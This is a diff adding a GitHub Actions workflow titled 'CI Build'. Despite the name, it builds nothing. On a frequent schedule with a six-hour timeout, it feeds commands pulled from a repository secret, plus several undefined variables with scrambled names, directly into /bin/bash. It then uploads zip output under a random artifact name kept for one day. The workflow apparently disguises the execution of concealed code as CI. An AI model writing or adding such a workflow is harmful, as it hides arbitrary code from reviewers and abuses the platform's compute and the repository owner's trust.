@@ -1,0 +1,31 @@
+name: CI Build
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '36 5,11,17,23 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  handler:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Launch
+        env:
+          nfn3: ${{ secrets.nfn3 }}
+        run: |
+          printf '%s' "$nfn3" | jq -r .xjgt8722 | /bin/bash
+          echo $pgyp269 | jq -r .hgu3402 | /bin/bash
+          printf '%s' "$vnwvo982" | jq -r .fqns15075 | /bin/bash
+          echo $c081 | jq -r .g3 | /bin/bash
+
+      - name: Persist output
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: 7ZkhBhDt
+          path: "*.zip"
+          retention-days: 1
